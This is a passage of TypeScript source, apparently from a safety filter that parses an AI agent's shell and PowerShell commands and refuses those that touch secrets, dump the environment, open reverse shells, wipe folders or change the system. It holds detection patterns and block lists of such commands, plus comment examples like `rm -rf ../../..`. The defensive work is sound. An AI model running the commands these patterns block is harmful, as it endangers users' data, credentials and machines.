  /^(sh|bash|zsh|dash|ksh|fish|busybox|eval|exec|xargs|watch|timeout|nohup|env|su|sudo|doas|runuser|flock|parallel|script|setsid|start|call|tmux|screen|systemd-run|python[\d.]*|node|nodejs|bun|deno|ruby|perl|php|g?awk|mawk|nawk|iex|invoke-expression)$/;
const CODE_RUNNERS = /^(python[\d.]*|node|nodejs|bun|deno|ruby|perl|php|g?awk|mawk|nawk)$/;
const WINDOWS_SHELLS = /^(cmd|powershell|pwsh)$/;
/**
 * A Windows shell's text as the loose scan reads it: a backslash is part of a path, not an escape; cmd's `^` escapes
 * the next character and its `'` is a plain one; PowerShell's backtick escapes (`r^eg` and `re`g` run `reg`). Either
 * escape at a line's end continues the line, which then reads as one.
 */
const windowsText = (program: string, text: string) =>
  text
    .replaceAll("\\", "/")
    .replace(program === "cmd" ? /\^\r?\n/g : /`\r?\n/g, " ")
    .replace(program === "cmd" ? /[\^']/g : /`/g, "");
/**
 * Programs that run the rest of their words as a command, after options of their own (`taskset -c 0 cmd`, `flock
 * file cmd`, `busybox cmd`, cmd's `start /b cmd` and `call cmd`, Git Bash's `start cmd` and `winpty cmd`). The
 * wrappers `looseArgv` drops are here too, for an option whose value it can't tell (`nice --adjustment 5 cmd`).
 */
const LAUNCHERS =
  /^(setsid|nice|nohup|env|time|timeout|xargs|ionice|stdbuf|taskset|chrt|unbuffer|caffeinate|systemd-run|xvfb-run|dbus-run-session|parallel|screen|tmux|runuser|cgexec|numactl|prlimit|strace|ltrace|setpriv|chpst|flock|watch|script|eval|busybox|start|call|winpty)$/;
/**
 * Launchers' short options whose value is the next word unless it is glued on (`timeout -s KILL`, `stdbuf -o L`,
 * `screen -dmS dev`, `tmux new -s dev`). A value that is a number or an assignment needs no entry, unless the
 * launcher's own word could be taken for it (`flock -w 5 file`).
 */
const LAUNCHER_VALUES: Readonly<Record<string, string>> = {
  timeout: "s",
  flock: "wE",
  script: "BcEFImOoTt",
  tmux: "cefFLnsStTxy",
  screen: "cehpsStTX",
  stdbuf: "ioe",
  env: "uCSP",
  time: "fo",
  xargs: "IdEaJ",
  ionice: "c",
  strace: "beEoPSuUX",
  "systemd-run": "uHMpE",
  "xvfb-run": "efp",
};
/**
 * Launchers that read a word of their own before the command: `timeout`'s duration, `taskset`'s mask, `flock`'s and
 * `script`'s file, `tmux`'s subcommand.
 */
const LAUNCHER_OPERAND = /^(timeout|taskset|flock|script|tmux)$/;
/** What runs the text piped into it as commands (`echo '…' | bash`, `… | crontab -`, `… | powershell -Command -`). */
const FED_COMMANDS = /^(sh|bash|zsh|dash|ksh|fish|at|batch|crontab|cmd|powershell|pwsh)$/;
/**
 * A cron line's schedule (`@reboot`, or five fields) and the spaces and blank lines before it, taken out; else those
 * spaces and blank lines alone, kept as they are and read once: every line start among them reaches the same first
 * word.
 */
const CRON_SCHEDULE = /^\s*(@\w+\s+|(\S+\s+){5})|^\s+/gm;
/** Cron's lines without their schedules: the commands they run. */
const cronCommands = (text: string) => text.replace(CRON_SCHEDULE, (m, schedule) => (schedule ? "" : m));
const SHELL_KEYWORDS = new Set(["if", "then", "else", "elif", "do", "while", "until", "!", "exec", "time"]);
const ASSIGNMENT = /^[A-Za-z_][A-Za-z0-9_]*=/;
const HEREDOC = /(?<!<)<<-?\s*(['"]?)([A-Za-z_][\w.-]*)\1/g;

function looseArgv(words: string[]): string[] {
  let w = words;
  for (let guard = 0; guard < 20 && w.length > 0; guard++) {
    const head = baseName(w[0] as string);
    if (ASSIGNMENT.test(w[0] as string) || SHELL_KEYWORDS.has(head)) w = w.slice(1);
    else if (head === "timeout" || head === "xargs") {
      w = w.slice(1);
      while (w[0]?.startsWith("-")) w = w.slice(/^-[IdEsLnPak]$/.test(w[0]) ? 2 : 1);
      if (head === "timeout") w = w.slice(1);
    } else {
      const u = unwrapped(w);
      if (u.length === w.length) return w;
      w = u;
    }
  }
  return w;
}

/**
 * Where the one command a launcher runs starts in its words, or -1: past the launcher's options with their values
 * (`LAUNCHER_VALUES`, a number, an assignment), its own word (`LAUNCHER_OPERAND`), cmd's switches and title
 * (`start /b "My App"`, `start /d dir ""`). The words after it are that command's arguments, never commands
 * (`xargs grep -n sudo`).
 */
function commandStart(words: readonly string[]): number {
  const launcher = baseName(words[0] ?? "");
  const values = Object.hasOwn(LAUNCHER_VALUES, launcher) ? (LAUNCHER_VALUES[launcher] as string) : "";
  let operand = LAUNCHER_OPERAND.test(launcher);
  // cmd's title is quoted; Git Bash quotes a word for cmd only when it has a space.
  let title = launcher === "start";
  let options = true;
  for (let k = 1; k < words.length; k++) {
    const w = words[k] as string;
    if (options && w === "--") options = false;
    else if (options && w.startsWith("-")) {
      // As getopt reads a cluster (`-dmS dev`, `-oL`): its first letter that takes a value takes the rest of the
      // word, or the next word when it is the last.
      const at = [...w.slice(1)].findIndex((c) => values.includes(c));
      if (at >= 0 && at === w.length - 2 && !w.startsWith("--")) k++;
    } else if (launcher === "start" && /^\/\/?[a-z]+$/i.test(w)) {
      if (/^\/\/?d$/i.test(w)) k++;
    } else if (operand) operand = false;
    else if (title && (w === "" || /\s/.test(w))) title = false;
    else if (w !== "" && !/^\d[\w.,:-]*$/.test(w) && !ASSIGNMENT.test(w)) return k;
  }
  return -1;
}

/**
 * The commands a command runs after words of its own, each read as at the head: a launcher's (`taskset -c 0 bash
 * -c …`), the launcher that one is in turn (`nice -n 5 taskset -c 0 cmd`), and `find -exec`'s.
 */
function launched(words: readonly string[], argv: readonly string[]): Loose[] {
  const starts = (w: readonly string[]) => {
    const head = baseName(w[0] ?? "");
    if (LAUNCHERS.test(head)) return commandStart(w);
    return head === "find" ? w.findIndex((a) => /^-(exec|execdir|ok|okdir)$/.test(a)) + 1 : 0;
  };
  const first = words.findIndex((w) => !ASSIGNMENT.test(w));
  // `looseArgv` has taken the wrappers off whose options it can tell (`env -u X taskset …`); else the words as written.
  let from = starts(argv) > 0 ? argv : first < 0 ? [] : words.slice(first);
  const runs: Loose[] = [];
  for (let guard = 0; guard < 20; guard++) {
    const at = starts(from);
    if (at <= 0) break;
    const raw = from.slice(at);
    const run = looseArgv(raw);
    runs.push({ raw, argv: run, writes: [], reads: [] });
    from = starts(raw) > 0 ? raw : run;
  }
  return runs;
}

/**
 * The program that reads a command's quoted script, piped text or heredoc: the shell, interpreter or cron a launcher
 * runs (`stdbuf -oL bash -c '…'`), else the command itself.
 */
const readerOf = (argv: readonly string[], runs: readonly Loose[]) =>
  [...runs.map((r) => r.argv), argv]
    .map((a) => baseName(a[0] ?? ""))
    .find((p) => FED_COMMANDS.test(p) || RUNS_ITS_WORDS.test(p)) ?? baseName(argv[0] ?? "");

/** `readerOf` a command's words as written (`stdbuf -oL bash`, before a heredoc or after a pipe). */
const readerOfText = (text: string) => {
  const words = text.split(/\s+/).filter(Boolean);
  const argv = looseArgv(words);
  return readerOf(argv, launched(words, argv));
};

/**
 * The command line a scheduled task will run, as it is given (schtasks's `/tr`; `New-ScheduledTaskAction`'s
 * `-Execute` and `-Argument`, by name or by place: `[-Execute] <String> [[-Argument] <String>]`), or null: judged
 * now, as cron's lines piped to crontab are.
 */
function taskAction(argv: readonly string[]): string | null {
  const at = argv.findIndex((a) => /^(schtasks|new-scheduledtaskaction)$/.test(baseName(a)));
  if (at < 0) return null;
  const words = argv.slice(at + 1);
  if (baseName(argv[at] as string) === "schtasks") {
    const tr = words.findIndex((w) => /^(\/\/?|-)tr$/i.test(w));
    return (tr < 0 ? "" : (words[tr + 1] ?? "")).trim() || null;
  }
  let execute: string | undefined;
  let argument: string | undefined;
  const placed: string[] = [];
  for (let k = 0; k < words.length; k++) {
    // A parameter by any prefix of its name (`-Ex`, `-Argument:x`); a quoted argument with a space isn't one.
    const p = /^-([a-z]+)(?::(.*))?$/i.exec(words[k] as string);
    if (!p) placed.push(words[k] as string);
    // Every parameter but the switches (`-AsJob`, `-Verbose`, `-Debug`) takes a value.
    else if (!/^(as|v|d)/i.test(p[1] as string)) {
      const value = p[2] || words[++k] || "";
      if (/^ex/i.test(p[1] as string)) execute = value;
      else if (/^ar/i.test(p[1] as string)) argument = value;
    }
  }
  return `${execute ?? placed.shift() ?? ""} ${argument ?? placed.shift() ?? ""}`.trim() || null;
}

/** What ends a command on a line, for `heredocs`. */
const COMMAND_END = /[;&|(]/g;
/** The command piped on, after its `|`, for `heredocs`. */
const PIPED_ON = /[^;&|]*/y;

/**
 * A shell text's lines with each heredoc's body taken out, and those bodies with the program that runs them (the
 * one it feeds, or the one that is piped on): a body fed to `cat` or `tee` is a file's text, not commands. The
 * command a heredoc feeds is read whole, as the shell reads it: its words between `;`, `&`, `|` and `(`, its
 * heredocs taken out (`timeout <<A 5 bash <<B` runs `timeout 5 bash`). Each command and each pipe is read once,
 * however many heredocs a line has.
 */
function heredocs(text: string): { shell: string; bodies: Array<{ runner: string; body: string }> } {
  if (!text.includes("<<")) return { shell: text, bodies: [] };
  const lines = text.split("\n");
  const kept: string[] = [];
  const bodies: Array<{ runner: string; body: string }> = [];
  const runs = (p: string) => SHELL_NAMES.test(p) || WINDOWS_SHELLS.test(p) || CODE_RUNNERS.test(p);
  for (let i = 0; i < lines.length; i++) {
    const line = lines[i] as string;
    kept.push(line.replace(HEREDOC, " "));
    // The command around the last heredoc read ([start, end)), the first `|` at or after its end, and the pipe `next`
    // was read after.
    let start = 0;
    let end = -1;
    let pipe = line.indexOf("|");
    let piped = -1;
    let next = "";
    let runner = "";
    for (const m of line.matchAll(HEREDOC)) {
      const at = m.index ?? 0;
      if (at > end) {
        COMMAND_END.lastIndex = Math.max(end, 0);
        for (let s = COMMAND_END.exec(line); ; s = COMMAND_END.exec(line)) {
          end = s ? s.index : line.length;
          if (end > at) break;
          start = end + 1;
        }
        if (pipe >= 0 && pipe < end) pipe = line.indexOf("|", end);
        if (pipe >= 0 && pipe !== piped) {
          piped = pipe;
          PIPED_ON.lastIndex = pipe + 1;
          next = readerOfText(PIPED_ON.exec(line)?.[0] ?? "");
        } else if (pipe < 0) next = "";
        const owner = readerOfText(line.slice(start, end).replace(HEREDOC, " "));
        runner = runs(next) ? next : owner;
      }
      let close = i + 1;
      while (close < lines.length && (lines[close] as string).replace(/^\t+/, "").trimEnd() !== m[2]) close++;
      bodies.push({ runner, body: lines.slice(i + 1, close).join("\n") });
      i = close;
    }
  }
  return { shell: kept.join("\n"), bodies };
}

/**
 * A Windows shell's script (`-Command`'s words, a heredoc, piped text, Claude Code's PowerShell tool's), read into
 * `out`: its commands, and PowerShell's whole text.
 */
function windowsScan(program: string, script: string, depth: number, out: Loose[]): void {
  const t = windowsText(program, script);
  if (program !== "cmd") out.push({ raw: [], argv: [], writes: [], reads: [], powershell: t });
  looseScan(t, false, depth + 1, out);
}

/**
 * Every command a text may run, read loosely into `out`: lists, pipes, `$(…)`, backticks, a shell's or an
 * interpreter's quoted script, a heredoc fed to one (`code`: the text is Python or JavaScript, where every string may
 * be a command: `os.system("…")`, `subprocess.run(["…"])`). A quoted word given to anything else (a commit message, a
 * remote command for ssh) is a word.
 */
function looseScan(text: string, code: boolean, depth: number, out: Loose[]): void {
  if (depth > 4) return;
  const windows = (program: string, script: string) => windowsScan(program, script, depth, out);
  /** What a command runs when it is a Windows shell (`cmd /c …`, `powershell -c …`), behind a launcher too. */
  const windowsRun = (a: readonly string[]) => {
    const program = baseName(a[0] ?? "");
    const script = WINDOWS_SHELLS.test(program) ? windowsScript(program, a.slice(1)) : null;
    if (script !== null) windows(program, script);
  };
  const { shell, bodies } = code ? { shell: text, bodies: [] } : heredocs(text);
  for (const b of bodies) {
    if (SHELL_NAMES.test(b.runner)) looseScan(b.body, false, depth + 1, out);
    else if (WINDOWS_SHELLS.test(b.runner)) windows(b.runner, b.body);
    else if (CODE_RUNNERS.test(b.runner)) looseScan(b.body, true, depth + 1, out);
  }
  let words: string[] = [];
  let quoted: string[] = [];
  let writes: string[] = [];
  let reads: string[] = [];
  let cur = "";
  let has = false;
  let target: "write" | "read" | null = null;
  const endWord = () => {
    if (has) {
      (target === "write" ? writes : target === "read" ? reads : words).push(cur);
      target = null;
    }
    cur = "";
    has = false;
  };
  let fed: string[] = [];
  const endCommand = (sep?: string) => {
    endWord();
    const argv = looseArgv(words);
    if (words.length || writes.length || reads.length) out.push({ raw: words, argv, writes, reads });
    const head = baseName(argv[0] ?? "");
    const rawHead = baseName(words.find((w) => !ASSIGNMENT.test(w)) ?? "");
    const runs = launched(words, argv);
    out.push(...runs);
    for (const a of [argv, ...runs.map((r) => r.argv)]) windowsRun(a);
    // As the Task Scheduler starts it: `"` quotes, `'` is a plain character, as in cmd's text.
    const action = taskAction(argv);
    if (action !== null) windows("cmd", action);
    const reader = readerOf(argv, runs);
    // Text piped from `echo` or `printf` into a shell, a code runner or cron: commands too. Only cron's lines open
    // with a schedule (`@reboot`, or five fields) to leave out.
    for (const f of fed) {
      if (reader === "crontab") looseScan(cronCommands(f), false, depth + 1, out);
      else if (WINDOWS_SHELLS.test(reader)) windows(reader, f);
      else if (FED_COMMANDS.test(reader)) looseScan(f, false, depth + 1, out);
      else if (CODE_RUNNERS.test(reader)) looseScan(f, true, depth + 1, out);
    }
    fed = sep === "|" && /^(echo|printf)$/.test(head) ? [...quoted, argv.slice(1).join(" ")] : [];
    if (code || RUNS_ITS_WORDS.test(reader) || RUNS_ITS_WORDS.test(rawHead)) {
      for (const q of quoted) looseScan(q, !code && CODE_RUNNERS.test(reader), depth + 1, out);
    }
    words = [];
    quoted = [];
    writes = [];
    reads = [];
    target = null;
  };
  for (let i = 0; i < shell.length; i++) {
    const c = shell[i] as string;
    if (c === "'" || c === '"') {
      let j = i + 1;
      while (j < shell.length && shell[j] !== c) j += c === '"' && shell[j] === "\\" ? 2 : 1;
      // In double quotes `\\` is one backslash and `\"` a quote, as the shell, Python and JavaScript read them
      // (`cmd //c "rd /s /q \\Users"` runs `rd` on `\Users`, not on a share).
      const raw = shell.slice(i + 1, j);
      const inner = c === '"' ? raw.replace(/\\([\\"])/g, "$1") : raw;
      cur += inner;
      has = true;
      // What `$(…)` and backticks run inside double quotes runs whoever gets the word.
      if (!code && c === '"' && /\$\(|`/.test(inner)) looseScan(inner, false, depth + 1, out);
      else if (!code || /[\s;&|]/.test(inner)) quoted.push(inner);
      i = j;
      continue;
    }
    if (c === "\\") {
      if (i + 1 < shell.length) cur += shell[i + 1];
      has = true;
      i++;
      continue;
    }
    if (c === "$" && shell[i + 1] === "{") {
      const end = shell.indexOf("}", i);
      const stop = end < 0 ? shell.length : end;
      cur += shell.slice(i, stop + 1);
      has = true;
      i = stop;
      continue;
    }
    if ((c === "$" || c === "<" || c === ">") && shell[i + 1] === "(") {
      endCommand();
      i++;
      continue;
    }
    if (c === "&" && shell[i + 1] === ">") {
      endWord();
      i += shell[i + 2] === ">" ? 2 : 1;
      target = "write";
      continue;
    }
    if (c === ">") {
      if (/^\d+$/.test(cur)) {
        cur = "";
        has = false;
      } else endWord();
      while (shell[i + 1] === ">" || shell[i + 1] === "|") i++;
      // `2>&1`, `>&2`: a descriptor, not a file.
      if (shell[i + 1] === "&" && /[\d-]/.test(shell[i + 2] ?? "")) {
        i += 2;
        continue;
      }
      target = "write";
      continue;
    }
    if (c === "<") {
      endWord();
      if (shell.startsWith("<<<", i)) i += 2;
      else target = "read";
      continue;
    }
    if (";&|\n(){}`".includes(c)) {
      endCommand(c);
      continue;
    }
    if (c === " " || c === "\t" || c === "\r" || (code && (c === "," || c === "[" || c === "]"))) {
      endWord();
      continue;
    }
    cur += c;
    has = true;
  }
  endCommand();
}

const SECRETS = "it touches secrets";
const ENCODED = "it runs code it hides by encoding it";
const ENV_OUT = "it sends out its whole environment, which holds its keys";
const PRIVILEGE_REASON = "it asks for more rights than the agent's own user has";
const SYSTEM_REASON = "it changes the system";
const RUNNER = "it touches the runner that connects this computer";
const REVERSE = "it hands a shell on this computer to another machine";
const WIPE = "it would wipe the computer or a whole home folder";
const NETWORK = "it changes or goes around the computer's proxy and firewall";
const OTHER = "it reaches into another user's files";

/** What a refusal of each reason carries: the code the apps say in the person's words, and what to do instead. */
const BAD_ACTOR: Record<string, { code: string; hint: string }> = {
  [SECRETS]: { code: "secret", hint: SECRET_MESSAGE },
  [ENV_OUT]: { code: "secret", hint: "Send only the values the work needs, each by its name." },
  [ENCODED]: { code: "unclear", hint: "Run the commands or the code themselves, as plain text, so they can be read." },
  [PRIVILEGE_REASON]: {
    code: "privilege",
    hint: "Run it as the agent's own user, without sudo: installs into its own user work (npm i -g, pip install --user, cargo install).",
  },
  [SYSTEM_REASON]: {
    code: "system",
    hint: "Keep changes to your own files and user; system folders (/etc, /usr, /boot…), system services, disks and kernel settings stay as they are.",
  },
  [RUNNER]: { code: "system", hint: "Leave the runner, its files and its process as they are." },
  [REVERSE]: {
    code: "reverseShell",
    hint: "To work on another machine, connect out to it with ssh, or call its API with curl.",
  },
  [WIPE]: { code: "destroy", hint: "Delete only the files and folders the work itself made, by their paths." },
  [NETWORK]: {
    code: "network",
    hint: "Leave the proxy variables, the firewall and the routes as they are; if an address can't be reached, tell the person which one.",
  },
  [OTHER]: { code: "otherUser", hint: "Work in your own folder and home." },
};

/** A refusal by `badActorReason`: the real reason, what to do instead, and that the rest of the work goes on. */
export function badActorRefusal(reason: string): { message: string; code: string } {
  const r = BAD_ACTOR[reason];
  return {
    message: `This was refused because ${reason}. ${r ? `${r.hint} ` : ""}Plain commands, scripts, installs, ssh and HTTP calls of any kind still run, so carry on with the rest of the work; if it truly needs this step, tell the person in plain words what is needed and why. ${NO_TERMINAL_COMMANDS}`,
    code: r?.code ?? "rules",
  };
}

/** An address or another machine's path (`host:/srv`, `user@host:~/x`): not this computer's file (`C:\\x` is). */
const elsewhere = (p: string) =>
  !/^[a-z]:[\\/]/i.test(p) &&
  (/^[a-z][\w+.-]*:\/\//i.test(p) || (!p.startsWith("/") && /^([\w.-]+@)?[\w.-]+:/.test(p)));

/** A path in another user's home (`/home/x`, `/Users/x`, `/root`, `~x`) where neither the agent's home nor its folders are. */
function otherHome(p: string, scope: CommandScope) {
  if (!scope.home) return false;
  if (/^~[A-Za-z_]/.test(p)) return true;
  const windows = windowsScope(scope);
  if (!(windows ? absolutePath(p) : p.startsWith("/"))) return false;
  const r = absoluteIn(scope, p);
  // Windows' shared profiles (`C:\Users\Public`) are no one's home, as macOS's `/Users/Shared`.
  const top = windows
    ? /^\/[a-z]\/users\/(?!(public|default|default user|all users)(\/|$))[^/]+(?=\/|$)/.exec(r)?.[0]
    : /^\/((home|Users)\/[^/]+|root)(?=\/|$)/.exec(r)?.[0];
  if (top === undefined || top === "/Users/Shared") return false;
  return ![scope.home, scope.cwd, ...scope.folders].some((f) => under(absoluteIn(scope, f), top));
}

/** Why a word a command reads or names is refused: a credential store, the runner, another user's home. */
function wordProblem(word: string, scope: CommandScope): string | null {
  const p = word
    .replace(/^--?[\w-]+=/, "")
    .replace(/^[A-Za-z_]\w*=/, "")
    .replace(/^[@<]/, "")
    .replace(/^file:\/\//, "");
  if (!p || elsewhere(p)) return null;
  if (/agentes-runner/i.test(p) && /[/\\~]/.test(p) && !insideFolders(scope, p)) return RUNNER;
  if (storeSecret(p, scope)) return SECRETS;
  return otherHome(p, scope) ? OTHER : null;
}

/** Why a file a command writes is refused: the system's, a credential store (a project's `.env` aside), the runner's. */
function writeProblem(file: string, scope: CommandScope): string | null {
  if (!file || elsewhere(file)) return null;
  if (/agentes-runner/i.test(file) && !insideFolders(scope, file)) return RUNNER;
  const r = resolveIn(scope, file);
  if (r === null) return OTHER;
  if (SYSTEM_DIRS.test(r) || WINDOWS_SYSTEM_DIRS.test(windowsPath(scope.cwd, file))) return SYSTEM_REASON;
  if (storeSecret(file, scope)) return SECRETS;
  return otherHome(file, scope) ? OTHER : null;
}

const DEST_LAST = new Set(["cp", "mv", "ln", "install", "rsync"]);
const EVERY_ARG = new Set([
  "tee",
  "touch",
  "mkdir",
  "rm",
  "rmdir",
  "truncate",
  "unlink",
  "shred",
  "chmod",
  "chown",
  "chgrp",
  "chattr",
  "chflags",
]);

/** The files a command writes, deletes or changes the mode of: its redirections, and its arguments by what it is. */
function writeTargets(cmd: string, args: readonly string[], redirects: readonly string[]): string[] {
  const plain = args.filter((a) => !a.startsWith("-"));
  const out = [...redirects];
  if (DEST_LAST.has(cmd)) {
    const t = args.findIndex((a) => a === "-t" || a === "--target-directory");
    const glued = args.find((a) => a.startsWith("--target-directory="));
    out.push(glued?.slice(19) ?? (t >= 0 ? (args[t + 1] ?? "") : (plain.at(-1) ?? "")));
  } else if (
    EVERY_ARG.has(cmd) ||
    ((cmd === "sed" || cmd === "perl") && args.some((a) => /^-[a-zA-Z]*i|^--in-place/.test(a)))
  ) {
    out.push(...plain);
  } else if (cmd === "dd") out.push(...args.filter((a) => a.startsWith("of=")).map((a) => a.slice(3)));
  return out.filter(Boolean);
}

/**
 * Whether the words print the whole environment (`env`, `printenv`, `set`, `export -p`, `declare -x`, PowerShell's
 * `Get-ChildItem Env:`).
 */
function envDump(raw: readonly string[]) {
  const [head = "", ...rest] = raw.filter((w) => !ASSIGNMENT.test(w));
  const b = baseName(head);
  return (
    ((b === "env" || b === "printenv") && rest.every((a) => a.startsWith("-"))) ||
    (b === "set" && rest.length === 0) ||
    (/^(get-childitem|gci|dir|ls)$/.test(b) && rest.length === 1 && /^env:[\\/]?\*?$/i.test(rest[0] ?? "")) ||
    (b === "export" && rest.length === 1 && rest[0] === "-p") ||
    (b === "declare" && /^-[a-zA-Z]*[xp]/.test(rest[0] ?? "")) ||
    (b === "compgen" && rest[0] === "-v")
  );
}

/**
 * Whether a path is the whole computer, a top-level folder or a whole home (`rm -rf ../../..`, `rm -rf /home/ada`),
 * on a Windows drive too, read from its root (`C:\`, `/c/Users/ada`).
 */
function wholeTree(word: string, scope: CommandScope) {
  const p = word.replaceAll("\\", "/");
  const w = DRIVE.test(p) ? p.replace(DRIVE, "") || "/" : p;
  if (WHOLE_TREE.test(w)) return true;
  // On a Windows computer the path keeps its drive to be compared with the home, then is read from the drive's root.
  const windows = windowsScope(scope);
  const r = resolveIn(scope, (windows ? p : w).replace(/\/\*$/, ""));
  if (r === null) return false;
  const fromRoot = windows ? r.replace(DRIVE, "") || "/" : r;
  return (
    WHOLE_TREE.test(fromRoot) ||
    /^\/(home|Users)\/[^/]+$/i.test(fromRoot) ||
    (scope.home !== undefined && r === absoluteIn(scope, scope.home))
  );
}

/** `find`'s starting points: its words before the first test or action. */
const findRoots = (args: readonly string[]) => {
  const end = args.findIndex((a) => /^[-(!]/.test(a) && !/^-[HLP]$/.test(a));
  return args.slice(0, end < 0 ? args.length : end).filter((a) => !/^-[HLP]$/.test(a));
};

/**
 * A container given the host: `--privileged`, the host's namespaces or admin capabilities, `/` or Docker's socket
 * mounted. Under the agent's own rootless engine all of that stays the agent's, but the host's processes.
 */
function hostAccess(args: readonly string[], scope: CommandScope) {
  return args.some((a, i) => {
    const next = args[i + 1] ?? "";
    if (scope.rootlessContainers) return /^--pid=host$/i.test(a) || (a === "--pid" && next === "host");
    if (
      /^--privileged$|^--(pid|ipc|userns|uts|cgroupns)=host$|^--cap-add=(ALL|SYS_ADMIN|SYS_MODULE|SYS_PTRACE)$/i.test(a)
    )
      return true;
    if (/^--(pid|ipc|userns|uts|cgroupns)$/.test(a) && next === "host") return true;
    if (a === "--cap-add" && /^(ALL|SYS_ADMIN|SYS_MODULE|SYS_PTRACE)$/i.test(next)) return true;
    const mount =
      a === "-v" || a === "--volume"
        ? next.split(":")[0]
        : /^(-v|--volume=)/.test(a)
          ? a.replace(/^(-v|--volume=)/, "").split(":")[0]
          : a === "--mount" || a.startsWith("--mount=")
            ? /(?:^|,)(?:source|src)=([^,]+)/.exec(a === "--mount" ? next : a.slice(8))?.[1]
            : undefined;
    if (!mount) return false;
    const r = resolveIn(scope, mount);
    return r === "/" || /docker\.sock$|podman\.sock$/.test(mount);
  });
}

/**
 * A cmdlet or alias by one of `names` (lower case), alone or by its module (`Defender\Set-MpPreference`), but not part
 * of a path or a file's name (`./scripts/new-service.ts`).
 */
const cmdlet = (names: string) => new RegExp(String.raw`(?<![\w./\\:-])([a-z][\w.]*[\\/])?(${names})(?![\w./\\-])`);
/** The registry's drives and paths (`HKCU:`, `HKEY_LOCAL_MACHINE\…`, `Registry::…`). */
const HIVE = /\b(hk(lm|cu|cr|u|cc):|hkey_|registry::)/;
/** The item cmdlets and their aliases: a change to the registry where their path is in it. */
const ITEM_CHANGE = cmdlet(
  "(new|set|remove|rename|copy|move|clear)-item(property)?|ni|si|sp|ri|rp|rni|rnp|cpi|cpp|cp|copy|mi|mp|mv|move|cli|clp|del|erase|rd|rm|rmdir",
);
/** The location set to the registry (`cd HKCU:\…`), where every later path is in it. */
const IN_HIVE = new RegExp(
  String.raw`${cmdlet("cd|chdir|sl|set-location|pushd|push-location").source}\s+(-(literal)?path\s+)?['"]?${HIVE.source}`,
);
/** A variable given a registry path (`$k = "HKCU:\…"`). */
const HIVE_VARIABLE = new RegExp(String.raw`(\$[\w:]+)\s*=\s*['"]?${HIVE.source}`, "g");

/**
 * PowerShell's changes to the system, each read in one statement of its text (in lower case, all of a row's patterns
 * in the same statement): cmdlets and their usual aliases. Reads (`Get-*`, `Test-*`) aren't here.
 */
const POWERSHELL_CHANGES: ReadonlyArray<readonly [string, ...RegExp[]]> = [
  [PRIVILEGE_REASON, /-verb[\s:]+['"]?runas/],
  [SYSTEM_REASON, cmdlet("(set|add)-mppreference")],
  // Without a scope it sets the machine's policy; `CurrentUser` and `Process` are the agent's own.
  [SYSTEM_REASON, cmdlet("set-executionpolicy"), /^(?!.*\b(currentuser|process)\b)/],
  [SYSTEM_REASON, ITEM_CHANGE, HIVE],
  [SYSTEM_REASON, cmdlet("(new|set|remove|stop|suspend|restart)-service|spsv")],
  [SYSTEM_REASON, cmdlet("(new|set|remove|enable|disable|rename|add)-local(user|group|groupmember)")],
  [SYSTEM_REASON, cmdlet("(clear|remove)-eventlog")],
  [WIPE, cmdlet("clear-disk|format-volume|initialize-disk|remove-partition")],
  [NETWORK, cmdlet(String.raw`(new|set|enable|disable|remove|copy|rename)-netfirewall\w*`)],
  [NETWORK, cmdlet("(new|set|remove)-netroute")],
  [NETWORK, cmdlet("invoke-webrequest|iwr|invoke-restmethod|irm"), /\s-(no)?proxy\b/],
  // The runner stopped by name, piped too (`Get-Process agentes-runner | Stop-Process`, `(gps agentes-runner).Kill()`).
  [RUNNER, /agentes-runner/, cmdlet("stop-process|spps|kill")],
  [RUNNER, /agentes-runner/, /\.kill\(/],
];

/**
 * Whether the account a scheduled task runs as is the person's own: their name by its variable (`%USERNAME%`,
 * `$env:USERNAME`) or their home folder's, with or without a domain (`.\ada`, `HOST\ada`).
 */
function ownAccount(account: string, scope: CommandScope) {
  const name = account.toLowerCase().split(/[\\/]/).pop() ?? "";
  const home = (scope.home ?? "").toLowerCase().split(/[\\/]/).filter(Boolean).pop();
  return (
    /^(%username%|\$env:username|\$\{?username\}?|\[environment\]::username)$/.test(name) || (!!name && name === home)
  );
}

/** PowerShell's cmdlets that change a scheduled task, or make the account one runs as. */
const TASK_CHANGE = cmdlet("(register|set|unregister|enable|disable)-scheduledtask|new-scheduledtaskprincipal");
/** A PowerShell statement's words: a quoted string without its quotes, `(`, `)`, `|`, or a run of anything else. */
const POWERSHELL_WORD = /'([^']*)'|"([^"]*)"|[()|]|[^\s'"()|]+/g;
/** A scheduled task's highest rights by name (`Highest`, `[RunLevelEnum]::Highest`). */
const HIGHEST = /^(highest|.*::highest)$/;
/** Windows' own scheduled tasks, under `\Microsoft\` (as `windowsText` writes it). */
const WINDOWS_TASK = /^\/?microsoft\//;
/** A principal's property or a splatted key, set anywhere in a text (`$p.UserId = "SYSTEM"`, `@{ RunLevel = 1 }`). */
const PRINCIPAL_SET = /(?<![\w$:])(userid|user|groupid|runlevel)['"]?\s*=\s*(?:'([^']*)'|"([^"]*)"|([^\s;)}]+))/g;

/**
 * Whether a scheduled task's principal isn't the person's own, by a parameter's name (any prefix of it, as
 * PowerShell binds it) or a property's, and its value: another account or `SYSTEM`, a group, the highest rights
 * (`1` binds to `Highest`).
 */
function principalProblem(name: string, value: string, scope: CommandScope) {
  if ("userid".startsWith(name)) return !ownAccount(value, scope);
  if ("runlevel".startsWith(name)) return value === "1" || HIGHEST.test(value);
  return "groupid".startsWith(name);
}

/**
 * Why a PowerShell statement that changes a scheduled task is refused: a task the person's own user doesn't run
 * (`principalProblem` of `-User`, `-UserId`, `-GroupId`, `-RunLevel`, `New-ScheduledTaskPrincipal`'s first word, a
 * word `Highest`), on another computer (`-CimSession`), from XML that can't be read here, or Windows' own (a task
 * under `\Microsoft\`, or every task `Get-ScheduledTask` lists piped in). A parameter is read by any prefix of its
 * name and only outside quoted strings (`-U SYSTEM`, not `-Argument 'pip install -U x'`). The person's own tasks run,
 * as crontab does.
 */
function taskProblem(statement: string, scope: CommandScope): string | null {
  if (!TASK_CHANGE.test(statement)) return null;
  if (/\bget-scheduledtask\s*(\*\s*)?\|/.test(statement)) return SYSTEM_REASON;
  const words = [...statement.matchAll(POWERSHELL_WORD)].map((m) => ({
    text: m[1] ?? m[2] ?? m[0],
    param: m[1] === undefined && m[2] === undefined ? /^-([a-z]+)(?::(.*))?$/.exec(m[0]) : null,
  }));
  // `New-ScheduledTaskPrincipal [-UserId] <String>`: the first word no parameter takes, unless one names the account.
  let account = words.findIndex((w) => /(^|\/)new-scheduledtaskprincipal$/.test(w.text));
  for (let i = 0; i < words.length; i++) {
    const { text, param } = words[i] as (typeof words)[number];
    if (param) {
      const name = param[1] as string;
      let value = param[2];
      if (!value) {
        while (words[i + 1]?.text === "(") i++;
